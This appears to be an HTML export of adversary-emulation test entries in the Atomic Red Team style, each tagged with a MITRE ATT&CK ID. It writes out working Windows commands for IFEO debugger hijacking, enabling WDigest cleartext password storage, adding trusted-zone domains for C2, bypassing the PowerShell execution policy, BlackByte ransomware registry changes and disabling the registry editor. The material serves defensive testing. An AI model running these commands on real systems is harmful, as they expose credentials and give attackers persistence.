<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 3309f53e-b22b-4eb6-8fd2-a6cf58b355a9</li>
<li><strong>name</strong>: Attaches Command Prompt as a Debugger to a List of Target Processes</li>
<li>
<p><strong>description</strong>: Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.
Upon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $input_table = "#{parent_list}".split(",")
$Name = "Debugger"
$Value = "#{attached_process}"
Foreach ($item in $input_table){
  $item = $item.trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: $input_table = "#{parent_list}".split(",")
Foreach ($item in $input_table)
{
  $item = $item.trim()
  reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2&gt;&amp;1 | Out-Null
}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1546.008</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: d430bf85-b656-40e7-b238-42db01df0183</li>
<li><strong>name</strong>: Enumerate PlugNPlay Camera</li>
<li>
<p><strong>description</strong>: Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1592.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 68254a85-aa42-4312-a695-38b7276307f8</li>
<li><strong>name</strong>: Use Powershell to Modify registry to store logon credentials</li>
<li>
<p><strong>description</strong>: Sets registry key using Powershell that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).
Open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '0' -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1112</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: cf447677-5a4e-4937-a82c-e47d254afd57</li>
<li><strong>name</strong>: Add domain to Trusted sites Zone</li>
<li><strong>description</strong>: Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.
Upon execution, details of the new registry entries will be displayed.
Additionally, open Registry Editor to view the modified entry in HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap.</li>
</ul>
<p>https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains#{bad_domain}\"
$name ="bad-subdomain"
new-item $key -Name $name -Force
new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains#{bad_domain}\"
Remove-item  $key -Recurse -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1112</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f3a6cceb-06c9-48e5-8df8-8867a6814245</li>
<li><strong>name</strong>: Change Powershell Execution Policy to Bypass</li>
<li>
<p><strong>description</strong>: Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.
They can either specify it during the execution of the powershell script or change the registry value for it.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: try { Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy} -Scope LocalMachine -Force } catch {}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1112</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 0b79c06f-c788-44a2-8630-d69051f1123d</li>
<li><strong>name</strong>: BlackByte Ransomware Registry Changes - Powershell</li>
<li><strong>description</strong>: This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See "Preparing to Worm" section: https://redcanary.com/blog/blackbyte-ransomware/
The steps are as follows:</li>
</ul>
<ol>
    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>
    <li>2. Enable OS to share network connections between different privilege levels</li>
    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>
</ol>
<p>The registry keys and their respective values will be created upon successful execution.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1112</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ac34b0f7-0f85-4ac0-b93e-3ced2bc69bb8</li>
<li><strong>name</strong>: Disable Windows Registry Tool</li>
<li>
<p><strong>description</strong>: Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.
See example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: powershell Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system" -Name DisableRegistryTools -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1112</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
